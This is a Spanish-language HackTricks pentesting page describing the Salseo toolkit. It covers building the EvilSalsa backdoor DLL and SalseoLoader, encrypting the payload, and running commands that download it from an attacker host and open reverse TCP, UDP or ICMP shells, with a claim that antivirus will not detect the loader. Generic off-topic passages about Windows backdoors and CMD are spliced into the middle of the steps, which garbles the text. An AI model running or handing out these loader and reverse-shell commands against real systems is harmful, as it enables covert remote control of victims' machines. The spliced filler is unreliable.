# Salseo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Compilando los binarios

Descarga el código fuente de Github y compila **EvilSalsa** y **SalseoLoader**. Necesitarás tener instalado **Visual Studio** para compilar el código.

Compila ambos proyectos para la arquitectura de la máquina Windows donde los vayas a utilizar (si Windows admite x64, compílalos para esa arquitectura).

Puedes **seleccionar la arquitectura** dentro de Visual Studio en la **pestaña "Build"** en **"Platform Target".**

(\*\*Si no puedes encontrar estas opciones, presiona en la **pestaña "Project"** y luego en **"\<Nombre del proyecto> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Luego, construye ambos proyectos (Build -> Build Solution) (Dentro de los registros aparecerá la ruta del ejecutable):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Preparando la puerta trasera

En primer lugar, necesitarás codificar el **EvilSalsa.dll**. Para hacerlo, puedes usar el script de Python **encrypterassembly.py** o puedes compilar el proyecto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

### Introducción

En este capítulo, discutiremos los backdoors en sistemas operativos Windows. Un backdoor es una puerta trasera que permite a un atacante acceder a un sistema sin ser detectado. Los backdoors pueden ser instalados en un sistema de varias maneras, incluyendo la explotación de vulnerabilidades en el sistema operativo o en una aplicación instalada en el sistema.

### Tipos de backdoors

Hay varios tipos de backdoors que se pueden instalar en un sistema Windows. Algunos de los más comunes incluyen:

- Backdoors de puerta trasera: Estos backdoors se instalan en el sistema y permiten al atacante acceder al sistema sin ser detectado. Estos backdoors pueden ser instalados por un atacante que tenga acceso físico al sistema o por un atacante que haya explotado una vulnerabilidad en el sistema.

- Backdoors de shell inverso: Estos backdoors permiten al atacante conectarse al sistema y ejecutar comandos en el sistema. Estos backdoors son especialmente útiles para los atacantes que quieren mantener el acceso al sistema después de que se haya cerrado la sesión.

- Backdoors de servidor web: Estos backdoors se instalan en un servidor web y permiten al atacante acceder al sistema a través del servidor web. Estos backdoors son especialmente útiles para los atacantes que quieren acceder a sistemas que están detrás de un firewall.

### Instalación de backdoors

La instalación de backdoors en un sistema Windows puede ser un proceso complicado. Los atacantes pueden utilizar varias técnicas para instalar backdoors en un sistema, incluyendo la explotación de vulnerabilidades en el sistema operativo o en una aplicación instalada en el sistema.

Una vez que se ha instalado un backdoor en un sistema, el atacante puede utilizar el backdoor para acceder al sistema y ejecutar comandos en el sistema. Los atacantes pueden utilizar los backdoors para robar información del sistema, instalar malware en el sistema o para mantener el acceso al sistema después de que se haya cerrado la sesión.

### Detección de backdoors

La detección de backdoors en un sistema Windows puede ser un proceso complicado. Los atacantes pueden utilizar varias técnicas para ocultar los backdoors en un sistema, incluyendo la encriptación de los backdoors y la utilización de técnicas de ofuscación.

Sin embargo, hay varias herramientas que se pueden utilizar para detectar backdoors en un sistema Windows. Algunas de estas herramientas incluyen:

- Herramientas de análisis de tráfico de red: Estas herramientas pueden utilizarse para detectar tráfico de red sospechoso que pueda estar relacionado con un backdoor.

- Herramientas de análisis de archivos: Estas herramientas pueden utilizarse para detectar archivos sospechosos que puedan estar relacionados con un backdoor.

- Herramientas de análisis de registro: Estas herramientas pueden utilizarse para detectar entradas de registro sospechosas que puedan estar relacionadas con un backdoor.

### Conclusiones

Los backdoors son una amenaza seria para los sistemas operativos Windows. Los atacantes pueden utilizar varios tipos de backdoors para acceder a un sistema y ejecutar comandos en el sistema. La detección de backdoors puede ser un proceso complicado, pero hay varias herramientas que se pueden utilizar para detectar backdoors en un sistema Windows.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader.**

**Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún AV...**

## **Ejecutar la puerta trasera**

### **Obtener una shell inversa TCP (descargando el dll codificado a través de HTTP)**

Recuerda iniciar un nc como oyente de la shell inversa y un servidor HTTP para servir el evilsalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obteniendo una shell inversa UDP (descargando un dll codificado a través de SMB)**

Recuerda iniciar un nc como oyente de la shell inversa, y un servidor SMB para servir el archivo evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obteniendo una shell inversa ICMP (dll codificada ya dentro de la víctima)**

**Esta vez necesitarás una herramienta especial en el cliente para recibir la shell inversa. Descarga:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desactivar respuestas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Ejecutar el cliente:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro de la víctima, ejecutemos la cosa salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando SalseoLoader como DLL exportando la función principal

Abre el proyecto SalseoLoader usando Visual Studio.

### Agrega antes de la función principal: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1).png>)

### Instala DllExport para este proyecto

#### **Herramientas** --> **Administrador de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**

![](<../.gitbook/assets/image (3) (1) (1) (1).png>)

#### **Busca el paquete DllExport (usando la pestaña Examinar) y presiona Instalar (y acepta el mensaje emergente)**

![](<../.gitbook/assets/image (4) (1) (1) (1).png>)

En la carpeta de tu proyecto aparecerán los archivos: **DllExport.bat** y **DllExport\_Configure.bat**

### **D**esinstala DllExport

Presiona **Desinstalar** (sí, es extraño, pero confía en mí, es necesario)

![](<../.gitbook/assets/image (5) (1) (1) (2).png>)

### **Cierra Visual Studio y ejecuta DllExport\_configure**

Simplemente **cierra** Visual Studio

Luego, ve a tu carpeta de **SalseoLoader** y **ejecuta DllExport\_Configure.bat**

Selecciona **x64** (si lo vas a usar dentro de una caja x64, ese fue mi caso), selecciona **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) y presiona **Aplicar**

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### **Abre el proyecto nuevamente con Visual Studio**

**\[DllExport]** ya no debería estar marcado como error

![](<../.gitbook/assets/image (8) (1) (1).png>)

### Compila la solución

Selecciona **Tipo de salida = Biblioteca de clases** (Proyecto --> Propiedades de SalseoLoader --> Aplicación --> Tipo de salida = Biblioteca de clases)

![](<../.gitbook/assets/image (10) (1).png>)

Selecciona la **plataforma x64** (Proyecto --> Propiedades de SalseoLoader --> Compilar --> Destino de la plataforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Para **compilar** la solución: Compilar --> Compilar solución (Dentro de la consola de salida aparecerá la ruta de la nueva DLL)

### Prueba la DLL generada

Copia y pega la DLL donde quieras probarla.

Ejecuta:
```
rundll32.exe SalseoLoader.dll,main
```
Si no aparece ningún error, ¡probablemente tienes una DLL funcional!

## Obtener una shell usando la DLL

No olvides usar un **servidor HTTP** y configurar un **escucha nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) es una herramienta de línea de comandos en sistemas operativos Windows que permite a los usuarios interactuar con el sistema operativo mediante comandos. Los comandos CMD pueden ser utilizados para realizar diversas tareas, como la gestión de archivos y directorios, la configuración de redes y la ejecución de programas. Los hackers pueden utilizar CMD para ejecutar comandos maliciosos y crear backdoors en sistemas Windows comprometidos.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
